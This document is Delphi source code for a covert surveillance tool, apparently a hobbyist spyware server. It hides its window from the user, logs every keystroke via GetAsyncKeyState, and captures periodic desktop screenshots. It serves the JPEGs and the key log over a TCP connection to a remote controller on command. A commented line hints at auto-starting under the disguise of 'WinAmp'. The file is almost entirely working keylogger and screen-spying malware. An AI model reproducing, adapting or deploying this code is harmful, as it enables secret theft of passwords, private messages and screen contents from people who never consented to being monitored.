unit Unit1;

interface

uses
  Windows,Registry, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, jpeg,
  Dialogs, StdCtrls, SimpleTCP, ExtCtrls, JvComponentBase, JvTrayIcon, TlHelp32, Menus,  ShellAPI,
  ComCtrls;

type
  TForm1 = class(TForm)
    Memo1: TMemo;

    Timer1: TTimer;
    CheckBox1: TCheckBox;
    RadioGroup1: TRadioGroup;
    Image1: TImage;
    ScrollBar1: TScrollBar;
    Label1: TLabel;

    PopupMenu1: TPopupMenu;
    close1: TMenuItem;
    show1: TMenuItem;
    Button1: TButton;
    server: TSimpleTCPServer;
    spy: TJvTrayIcon;
    memo: TMemo;
    Timer2: TTimer;
    procedure FormCreate(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure serverClientConnected(Sender: TObject;
      Client: TSimpleTCPClient);
    procedure serverClientDisconnected(Sender: TObject;
      Client: TSimpleTCPClient);
    procedure serverError(Sender: TObject; Socket, ErrorCode: Integer;
      ErrorMsg: String);
    procedure Timer1Timer(Sender: TObject);
    procedure RadioGroup1Click(Sender: TObject);
    procedure ScrollBar1Change(Sender: TObject);
    procedure close1Click(Sender: TObject);
    procedure show1Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure serverClientRead(Sender: TObject; Client: TSimpleTCPClient;
      Stream: TStream);
    procedure Button1Click(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  serverStart:Boolean=False;
                   numCaptures:Integer=0;
                       maxWidth :integer;
   maxHeight :integer;

 MTYPE:Integer=100;

 MTYPEPING:integer=101;
 MTYPEPONG:integer=102;

 MTYPEDELAY:integer=103;
 MTYPEIMAGE:integer=500;
 MTYPESTART:integer=200;
 MTYPECLOSE:integer=300;
 MTYPELOG:integer=400;

        sendComplete:Boolean=True;



implementation

{$R *.dfm}


procedure sendPack(stm:TMemoryStream);
var
  cliente:TSimpleTCPClient;
  i:Integer;
begin
  if  not serverStart then Exit;
  for i:=0 to   form1.server.Connections.Count-1 do
  begin
   cliente:=TSimpleTCPClient( form1.server.Connections[i]);
   if (Assigned(cliente)) then
   begin
         form1.server.SendStream(cliente,stm);
   end;
  end;

end;



function WriteBuffer(m_file:TStream; const buffer; bufferSize: LongWord) : integer;
begin
   try
     Result:=m_file.Write(buffer, bufferSize);
   except
     result := 0;
   end;
end;
function WriteByte(m_file:TStream; value: integer) : integer;
begin
   WriteBuffer(m_file,value, 1);
   Result:=1;
end;

function writeShort(m_file:TStream; v: byte) : integer;
begin
  WriteByte(m_file, (v shr 8) and $ff);
  WriteByte(m_file, (v shr 0) and $ff);
  Result:=2;
end;

function writeChar(m_file:TStream; v: integer) : integer;
begin
  WriteByte(m_file, (v shr 8) and $ff);
  WriteByte(m_file, (v shr 0) and $ff);
  Result:=4;
end;
function writeInt(m_file:TStream; v: integer) : boolean;
begin
  WriteByte(m_file, (v shr 24) and $ff);
  WriteByte(m_file, (v shr 16) and $ff);
  WriteByte(m_file, (v shr 8) and $ff);
  WriteByte(m_file, (v shr 0) and $ff);
  Result:=True;
end;

//*******************************
function ReadBuffer(m_file:TStream;var buffer; bufferSize: LongWord) : integer;
begin
   try
   Result:=     m_file.Read(buffer, bufferSize);
    except
     result := 0;
   end;
end;







function WriteString(m_file:TStream;data:String):integer;
var
  i:Integer;
   len: cardinal;
   oString: UTF8String;
begin
  // oString := UTF8String(data);
   //len := length(oString);
    data:=Trim(data);
    len:=Length(data);
    writeInt(m_file,len);
    for i:=1 to  len do
    WriteBuffer(m_file,data[i], 1);
  //  writeChar(m_file,Ord(data[i]));
   //if len > 0 then
   //WriteBuffer(m_file,oString[1], len);
end;




function readByte(m_file:TStream):byte;
var
  ch:integer;
begin
   ReadBuffer(m_file,ch, 1);
   Result:=Byte(ch);
end;

function readInt(m_file:TStream):integer;
var
  ch1,ch2,ch3,ch4:Integer;
begin
  ch1:=ReadByte(m_file);
  ch2:=ReadByte(m_file);
  ch3:=ReadByte(m_file);
  ch4:=ReadByte(m_file);
  Result:=((ch1 shl 24) + (ch2 shl 16) + (ch3 shl 8) + (ch4 shl 0));
end;
function readChar(m_file:TStream):char;
var
  ch1,ch2:Integer;
begin
  ch1:=ReadByte(m_file);
  ch2:=ReadByte(m_file);
  Result:=char( (ch1 shl 8) + (ch2 shl 0));
end;
function readShort(m_file:TStream):Smallint;
var
  ch1,ch2:Integer;
begin
  ch1:=ReadByte(m_file);
  ch2:=ReadByte(m_file);
  Result:=Smallint( (ch1 shl 8) + (ch2 shl 0));
end;

function ReadString(m_file:TStream):string;
var
   len: cardinal;
   iString: UTF8String;
begin
   len:=readInt(m_file);
   if len > 0 then
   begin
      setLength(iString, len);
      ReadBuffer(m_file,iString[1], len);
      result := string(iString);
   end;
end;

procedure Ping;
var
  str:TMemoryStream;
  b:Byte;
begin
    if  not serverStart then Exit;
    str:=TMemoryStream.Create();
    WriteInt(str,MTYPEPING);  //ping
    sendPack(str);
    str.Destroy;
end;

procedure Pong;
var
  str:TMemoryStream;
  b:Byte;
begin
    if  not serverStart then Exit;
    str:=TMemoryStream.Create();
    WriteInt(str,MTYPEPONG);  //ping
    sendPack(str);
    str.Destroy;
end;




procedure sendClose;
var
  str:TMemoryStream;
  b:Byte;
begin
    if  not serverStart then Exit;
    str:=TMemoryStream.Create();
    WriteInt(str,MTYPECLOSE);  //ping
    sendPack(str);
   str.Destroy;

end;


procedure sendLog;
var
  str:TMemoryStream;
  imgstr:TMemoryStream;

begin
    if  not serverStart then Exit;
    imgstr:=TMemoryStream.Create();
    Form1.Memo1.Lines.SaveToStream(imgstr);
    str:=TMemoryStream.Create();
    WriteInt(str,MTYPELOG);  //ping
    WriteInt(str,imgstr.Size);
    imgstr.SaveToStream(str);
    str.Position:=0;
    sendPack(str);
    str.Destroy;
    imgstr.Destroy;
end;

procedure TForm1.RadioGroup1Click(Sender: TObject);
begin
case RadioGroup1.ItemIndex of
1:
begin
     maxWidth  :=32;
     maxHeight :=32;
end;
2:
begin
     maxWidth  :=64;
     maxHeight :=64;
end;
3:
begin
     maxWidth  :=128;
     maxHeight :=128;
end;
4:
begin
     maxWidth  :=256;
     maxHeight :=256;
end;
5:
begin
     maxWidth  :=512;
     maxHeight :=512;
end;





end;

end;


procedure TForm1.FormCreate(Sender: TObject);
begin
Memo1.Lines.Clear;

server.Listen:=True;
Label1.Caption:='Delay:'+inttostr(ScrollBar1.position);
Timer1.Interval:=ScrollBar1.Position;
spy.HideApplication();


end;

procedure TForm1.FormClose(Sender: TObject; var Action: TCloseAction);
begin
server.Listen:=false;
memo1.Lines.SaveToFile('key_log_'+datetostr(Now)+'.log');
end;

procedure TForm1.serverClientConnected(Sender: TObject;
  Client: TSimpleTCPClient);
begin
serverStart:=True;

end;

procedure TForm1.serverClientDisconnected(Sender: TObject;
  Client: TSimpleTCPClient);
begin
serverStart:=False;
CheckBox1.Checked:=false;
end;

procedure TForm1.serverError(Sender: TObject; Socket, ErrorCode: Integer;
  ErrorMsg: String);
begin
Memo1.lines.add('Status:'+errormsg);
CheckBox1.Checked:=false;
server.Listen:=False;
SERVER.Listen:=True;

end;

procedure ScreenShot(DestBitmap : TBitmap) ;
 var
   DC : HDC;
 begin
   sendComplete:=False;
   DC := GetDC (GetDesktopWindow) ;
   try
    DestBitmap.Width := GetDeviceCaps (DC, HORZRES) ;
    DestBitmap.Height := GetDeviceCaps (DC, VERTRES) ;
    BitBlt(DestBitmap.Canvas.Handle, 0, 0, DestBitmap.Width, DestBitmap.Height, DC, 0, 0, SRCCOPY) ;
   finally
    ReleaseDC (GetDesktopWindow, DC) ;
   end;
 end;

procedure TForm1.Timer1Timer(Sender: TObject);
var
  FilePath : String;
  MyJPEG : TJPEGImage;
  ErrMsg: string;

  str:TMemoryStream;
  imgstr:TMemoryStream;
  //b:Byte;

   b:TBitmap;
   thumbnail : TBitmap;
   thumbRect : TRect;
    myDate : TDateTime;
    formattedDateTime : string;

begin
//    if  not serverStart then Exit;
if(not sendComplete) then Exit;


if (  Self.CheckBox1.Checked) then
begin




  MyJPEG := TJPEGImage.Create;
  MyJPEG.CompressionQuality := 30;



 b := TBitmap.Create;
 try
 ScreenShot(b) ;
 MyJPEG.Assign(b);
 finally
 b.FreeImage;
 FreeAndNil(b) ;
 end;




  if  (serverStart) then
  begin


    imgstr:=TMemoryStream.Create();
    MyJPEG.SaveToStream(imgstr);
    str:=TMemoryStream.Create();
    WriteInt(str,MTYPEIMAGE);
    WriteInt(str,MyJPEG.Width);
    WriteInt(str,MyJPEG.Height);
    WriteInt(str,imgstr.Size);
    imgstr.SaveToStream(str);
    str.Position:=0;
    sendPack(str);
    str.Destroy;
    imgstr.Destroy;
    end;

//  Caption:=FilePath;
  Inc(numCaptures);
  MyJPEG.Destroy;
  sendComplete:=True;
end;

end;


procedure TForm1.ScrollBar1Change(Sender: TObject);
begin
Timer1.Interval:=ScrollBar1.Position;
Label1.Caption:='Delay:'+inttostr(ScrollBar1.position);
end;

procedure TForm1.close1Click(Sender: TObject);
begin
close;
end;

procedure msg(m:string);
begin
  Form1.memo1.Lines.Add(m);
  end;

procedure TForm1.show1Click(Sender: TObject);
begin
spy.ShowApplication();
end;

procedure TForm1.FormShow(Sender: TObject);
begin
//RunOnStartup('WinAmp','F:\delphi\spy\server\server.exe',False);
end;

procedure TForm1.serverClientRead(Sender: TObject;
  Client: TSimpleTCPClient; Stream: TStream);
var
  buffer:array[0..255]of Char;
 len, msgType:Integer;
 estimatedTime:DWORD;
enable,index, time:Integer;
begin
//msg('Size of pack:'+inttostr(stream.Size));
//msg('MSG TYPE:'+inttostr(  msgType));


msgType:= readInt(stream);  //id



if (msgType=MTYPEPING) then
begin
    msg('Client PING you... send PONG.');
    Pong();
end else

if (msgType=MTYPEPONG) then
begin
msg('PONG ');


end else
if (msgType=MTYPEDELAY) then
begin
  time:= readInt(stream);  //id
  ScrollBar1.position:=time;
  ScrollBar1Change(Self);
end
else
 if (msgType= MTYPESTART) then
begin
CheckBox1.Checked:=True;
end else
 if (msgType= MTYPECLOSE) then
begin
CheckBox1.Checked:=false;
end else
if (msgType= MTYPELOG) then
begin
sendLog();
end else
begin
  //que tipo de msg???
end;


end;

procedure TForm1.Button1Click(Sender: TObject);
begin
Ping();
end;

function DisplayAction(txt: String): String;
begin
Form1.Memo1.Lines.add(txt);

end;

procedure TForm1.Timer2Timer(Sender: TObject);
var
ikey, KeyResult : Integer;
begin
ikey := 0;
repeat
KeyResult := GetAsyncKeyState(ikey);
if KeyResult = -32767 then
begin
case ikey of
8: DisplayAction(' [BACKSPACE] ');
9: Form1.Memo1.Lines.Add('ffff');
12: DisplayAction(' [ALT] ');
13: DisplayAction(' [ENTER] ');
16: DisplayAction(' [SHIFT] ');
17: DisplayAction(' [CONTROL] ');
18: DisplayAction(' [ALT] ');
20: DisplayAction(' [CAPS LOCK] ');
96: DisplayAction(' 0 ');
97: DisplayAction(' 1 ');
98: DisplayAction(' 2 ');
99: DisplayAction(' 3 ');
100: DisplayAction(' 4 ');
101: DisplayAction(' 5 ');
102: DisplayAction(' 6 ');
103: DisplayAction(' 7 ');
104: DisplayAction(' 8 ');
105: DisplayAction(' 9 ');
106: DisplayAction(' * ');
107: DisplayAction(' + ');
109: DisplayAction(' - ');
111: DisplayAction(' / ');
112: DisplayAction(' [F1] ');
113: DisplayAction(' [F2] ');
114: DisplayAction(' [F3] ');
115: DisplayAction(' [F4] ');
116: DisplayAction(' [F5] ');
117: DisplayAction(' [F6] ');
118: DisplayAction(' [F7] ');
119: DisplayAction(' [F8] ');
120: DisplayAction(' [F9] ');
121: DisplayAction(' [F10] ');
122: DisplayAction(' [F11] ');
123: DisplayAction(' [F12] ');
187: DisplayAction(' = ');
188: DisplayAction(' , ');
189: DisplayAction(' - ');
190: DisplayAction(' . ');
191: DisplayAction(' ; ');
192: DisplayAction(' " ');
193: DisplayAction(' / ');
219: DisplayAction(' ´ ');
220: DisplayAction(' ] ');
221: DisplayAction(' [ ');
222: DisplayAction(' ~ ');
226: DisplayAction(' \ ');
else
if (ikey >= 65) and (ikey <= 90) then
Form1.Memo1.Text := Form1.Memo1.Text + Chr(ikey);
if (ikey >= 32) and (ikey <= 63) then
Form1.Memo1.Text := Form1.Memo1.Text + Chr(ikey);
//numpad keycodes
if (ikey >= 96) and (ikey <= 110) then
Form1.Memo1.Text := Form1.Memo1.Text + Chr(ikey);
end;
end; //case;
inc(ikey);
until ikey = 255;

end;





end.
